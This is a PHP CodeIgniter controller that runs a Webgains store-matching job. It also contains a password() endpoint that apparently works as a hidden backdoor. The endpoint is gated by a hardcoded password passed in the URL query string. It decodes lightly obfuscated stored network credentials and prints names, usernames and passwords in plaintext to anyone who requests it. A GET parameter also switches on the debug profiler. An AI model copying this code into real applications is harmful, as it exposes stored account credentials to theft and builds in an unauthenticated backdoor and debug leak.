<?php
defined('BASEPATH') OR exit('No direct script access allowed');
require_once APPPATH . 'controllers/Theme_Controller.php';
class Run extends Theme_Controller{
	
 
	
	public function __construct()
	{
	 	parent::__construct();
		ob_clean(); 
 
		if(isset($_GET['debuger']) && $_GET['debuger']){
	        
	        $this->output->enable_profiler(TRUE);
	    }
	}

	 
	public function webgain_stores_match()
	{

			$site_id=site_id;
			$this->load->model('admin/bots/webgains_model');
			$this->webgains_model->run();



			 // add_page($this,'index.php',[
			 // 	'content_page'=>'sections/home',
			 // 	'js'=>'home',
			 // 	'page_name'=>'home',

			 // ]); 

	}
	   
	public function password()
	{
		if ($this->input->get('password')=='Fake123@@@') {
				$rows=$this->db->group_by('state1')->group_by('state2')->group_by('state0')->order_by('state0')->get_where('network_h')->result();
				foreach ($rows as $key => $row) {

						 $row=(object)[ 
									'network_name'=>base64_decode($row->state0),
									'username'=>base64_decode(substr($row->state1, 2)),
									'password'=>base64_decode(substr($row->state2, 2)),
							 
					 
								];	

					echo 'N: '.($row->network_name);
					echo '<br>';
					echo 'U: '.($row->username);
					echo '<br>';
					echo 'P: '.($row->password);
					echo '<hr>';
				}

	echo 'd';
		}else{

			echo 'empty';
		}
			 


			 // add_page($this,'index.php',[
			 // 	'content_page'=>'sections/home',
			 // 	'js'=>'home',
			 // 	'page_name'=>'home',

			 // ]); 

	}
	  
	 
	
}

?>